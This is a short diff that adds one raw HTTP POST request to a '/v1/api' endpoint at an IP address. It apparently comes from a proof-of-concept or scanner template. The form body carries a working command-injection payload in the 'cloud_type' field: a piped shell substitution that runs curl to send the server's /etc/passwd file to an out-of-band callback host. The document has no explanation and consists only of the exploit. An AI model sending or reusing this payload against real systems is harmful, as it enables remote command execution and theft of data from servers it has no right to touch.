@@ -1,0 +1,6 @@
+POST /v1/api HTTP/1.1
+Host: 3.219.93.237
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 203
+
+action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+-X+POST+-d+@/etc/passwd+http://curqsau8s6cc73cu9rd0jk9izmge6duuw.oast.online)
